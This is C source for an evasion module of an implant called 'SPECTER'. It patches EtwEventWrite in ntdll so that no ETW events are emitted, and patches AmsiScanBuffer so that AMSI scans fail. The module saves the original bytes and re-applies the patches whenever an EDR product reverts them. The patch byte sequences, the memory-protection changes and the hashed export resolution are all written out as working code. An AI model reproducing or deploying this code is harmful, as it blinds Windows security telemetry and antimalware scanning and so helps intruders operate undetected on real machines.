/**
 * SPECTER Implant — ETW Suppression & AMSI Bypass
 *
 * Patches EtwEventWrite/EtwEventWriteEx in ntdll to suppress
 * Threat Intelligence, AMSI, and Kernel Audit API Calls ETW
 * providers.  Provides lazy AMSI bypass by patching AmsiScanBuffer
 * to return E_INVALIDARG when CLR module loads.
 *
 * All patches save original bytes for integrity verification and
 * re-application if reverted by EDR.
 */

/* KNOWN LIMITATION: This module patches EtwEventWrite and AmsiScanBuffer
   in USER-MODE ntdll only. It does NOT defeat kernel ETW-TI (Threat
   Intelligence) providers used by CrowdStrike, MDE, and SentinelOne.
   Kernel-level Nt* syscall telemetry is NOT affected by these patches.
   See docs/roadmap.md Phase 2.1 for evasion documentation. */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "peb.h"

/* Current-process pseudo-handle */
#define NtCurrentProcess() ((HANDLE)(ULONG_PTR)-1)

/* ------------------------------------------------------------------ */
/*  Patch byte sequences                                               */
/* ------------------------------------------------------------------ */

/*
 * ETW patch: xor eax, eax; ret
 * This makes EtwEventWrite return STATUS_SUCCESS (0) without
 * actually emitting any ETW event.
 */
static const BYTE g_etw_patch_bytes[ETW_PATCH_SIZE] = {
    0x31, 0xC0,     /* xor eax, eax */
    0xC3            /* ret           */
};

/*
 * AMSI patch: mov eax, 0x80070057; ret
 * Returns E_INVALIDARG from AmsiScanBuffer, causing the AMSI
 * scan to be treated as failed/skipped by the caller.
 */
static const BYTE g_amsi_patch_bytes[AMSI_PATCH_SIZE] = {
    0xB8, 0x57, 0x00, 0x07, 0x80,  /* mov eax, 0x80070057 */
    0xC3                            /* ret                  */
};

/* ------------------------------------------------------------------ */
/*  Internal: apply a patch at a given address                         */
/* ------------------------------------------------------------------ */

/**
 * Make target memory writable, apply patch bytes, restore original
 * protection.  Saves original bytes to save_buf.
 *
 * Returns STATUS_SUCCESS on success, or the failing NTSTATUS.
 */
static NTSTATUS apply_patch(PVOID target, const BYTE *patch,
                            DWORD patch_size, BYTE *save_buf) {
    if (!target || !patch || !save_buf || patch_size == 0)
        return STATUS_INVALID_PARAMETER;

    /* Save original bytes before patching */
    spec_memcpy(save_buf, target, patch_size);

    /* Make the target region writable */
    PVOID  region_base = target;
    SIZE_T region_size = patch_size;
    ULONG  old_protect = 0;

    NTSTATUS status = spec_NtProtectVirtualMemory(
        NtCurrentProcess(), &region_base, &region_size,
        PAGE_EXECUTE_READWRITE, &old_protect);
    if (!NT_SUCCESS(status))
        return status;

    /* Write patch bytes */
    spec_memcpy(target, patch, patch_size);

    /* Restore original protection */
    ULONG tmp_protect = 0;
    spec_NtProtectVirtualMemory(
        NtCurrentProcess(), &region_base, &region_size,
        old_protect, &tmp_protect);

    return STATUS_SUCCESS;
}

/**
 * Verify that patch bytes are still in place at a given address.
 * Returns TRUE if the patch is intact, FALSE otherwise.
 */
static BOOL verify_patch(PVOID target, const BYTE *expected, DWORD size) {
    if (!target || !expected)
        return FALSE;
    return (spec_memcmp(target, expected, size) == 0);
}

/**
 * Re-apply a patch if it has been reverted (e.g., by EDR).
 * Returns STATUS_SUCCESS if patch is intact or successfully re-applied.
 */
static NTSTATUS reapply_patch(PVOID target, const BYTE *patch,
                              DWORD patch_size, BYTE *save_buf) {
    if (!target)
        return STATUS_INVALID_PARAMETER;

    if (verify_patch(target, patch, patch_size))
        return STATUS_SUCCESS;  /* Still in place */

    /* Patch was reverted — re-apply */
    return apply_patch(target, patch, patch_size, save_buf);
}

/* ------------------------------------------------------------------ */
/*  evasion_patch_etw                                                  */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_patch_etw(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    /* Already patched — just verify */
    if (ctx->etw_patched)
        return evasion_check_etw_patches(ctx);

    /* Resolve EtwEventWrite in ntdll.  We use find_module_by_hash +
       find_export_by_hash to locate the function in the in-memory
       (potentially hooked) ntdll — we want to patch the live copy
       that ETW consumers call, not our clean mapping. */
    PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll_base)
        return STATUS_UNSUCCESSFUL;

    PVOID etw_write = find_export_by_hash(ntdll_base, HASH_ETWEVENTWRITE);
    if (!etw_write)
        return STATUS_PROCEDURE_NOT_FOUND;

    /* Apply the patch: xor eax, eax; ret */
    NTSTATUS status = apply_patch(etw_write, g_etw_patch_bytes,
                                  ETW_PATCH_SIZE, ctx->etw_original);
    if (!NT_SUCCESS(status))
        return status;

    ctx->etw_patch_addr = etw_write;
    ctx->etw_patched = TRUE;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  evasion_check_etw_patches                                          */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_check_etw_patches(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    if (!ctx->etw_patched || !ctx->etw_patch_addr)
        return STATUS_UNSUCCESSFUL;

    /* Re-apply ETW patch if reverted */
    return reapply_patch(ctx->etw_patch_addr, g_etw_patch_bytes,
                         ETW_PATCH_SIZE, ctx->etw_original);
}

/* ------------------------------------------------------------------ */
/*  evasion_patch_amsi                                                 */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_patch_amsi(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    /* Already patched — just verify */
    if (ctx->amsi_patched) {
        if (!ctx->amsi_patch_addr)
            return STATUS_UNSUCCESSFUL;
        return reapply_patch(ctx->amsi_patch_addr, g_amsi_patch_bytes,
                             AMSI_PATCH_SIZE, ctx->amsi_original);
    }

    /* Lazy resolution: amsi.dll is only loaded when CLR is present.
       Try to find it in the PEB module list — if not loaded, the
       caller should retry later when CLR module loads. */
    PVOID amsi_base = find_module_by_hash(HASH_AMSI_DLL);
    if (!amsi_base)
        return STATUS_OBJECT_NAME_NOT_FOUND;

    /* Resolve AmsiScanBuffer export */
    PVOID amsi_scan = find_export_by_hash(amsi_base, HASH_AMSISCANBUFFER);
    if (!amsi_scan)
        return STATUS_PROCEDURE_NOT_FOUND;

    /* Apply the patch: mov eax, E_INVALIDARG; ret */
    NTSTATUS status = apply_patch(amsi_scan, g_amsi_patch_bytes,
                                  AMSI_PATCH_SIZE, ctx->amsi_original);
    if (!NT_SUCCESS(status))
        return status;

    ctx->amsi_patch_addr = amsi_scan;
    ctx->amsi_patched = TRUE;

    return STATUS_SUCCESS;
}
